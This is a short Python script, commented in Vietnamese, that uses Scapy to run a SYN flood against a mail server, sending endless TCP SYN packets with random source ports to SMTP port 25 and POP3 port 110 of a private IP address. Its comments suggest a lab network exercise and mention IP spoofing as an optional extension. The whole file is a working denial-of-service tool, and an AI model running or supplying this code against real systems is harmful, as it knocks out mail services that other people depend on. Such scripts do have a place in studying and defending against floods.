
import random
from scapy.all import IP, TCP, send

# Cấu hình thông tin mục tiêu (Thay đổi IP này thành IP thực tế của Mail Server trong mạng của bạn)
TARGET_IP = "10.20.0.112"  # Ví dụ: IP của máy chủ Mail Server (Tiên)
TARGET_PORTS = [25, 110]     # Cổng SMTP (25) và POP3 (110)

def generate_syn_flood():
    print(f"[!] Bắt đầu tấn công SYN Flood tới Mail Server: {TARGET_IP}")
    print(f"[!] Các cổng mục tiêu: {TARGET_PORTS}")
    print("[!] Nhấn Ctrl + C để dừng kịch bản tấn công.\n")

    packet_count = 0

    try:
        while True:
            # Chọn ngẫu nhiên một trong hai cổng mục tiêu (25 hoặc 110)
            target_port = random.choice(TARGET_PORTS)
            
            # Tạo ngẫu nhiên cổng nguồn (source port) để giả lập nhiều máy trạm/tiến trình khác nhau
            source_port = random.randint(1024, 65535)
            
            # Tạo ngẫu nhiên IP nguồn (IP Spoofing giả lập nhiều nguồn tấn công phân tán - tùy chọn nâng cao)
            # Hoặc để Scapy tự động dùng IP của máy attacker hiện tại.
            
            # Xây dựng gói tin TCP thô với cờ SYN (flags="S")
            # IP(dst=TARGET_IP) tạo gói tin lớp mạng hướng đến Mail Server
            # TCP(dport=target_port, sport=source_port, flags="S") tạo gói tin TCP với cờ SYN được bật[cite: 1]
            packet = IP(dst=TARGET_IP) / TCP(dport=target_port, sport=source_port, flags="S")
            
            # Bắn gói tin đi với tốc độ nhanh (verbose=False để không in rác màn hình terminal)
            send(packet, verbose=False)
            
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"[*] Đã bắn {packet_count} gói tin SYN tới Port {target_port}...")

    except KeyboardInterrupt:
        print(f"\n[+] Đã dừng kịch bản tấn công SYN Flood. Tổng số gói tin đã gửi: {packet_count}")

if __name__ == "__main__":
    generate_syn_flood()
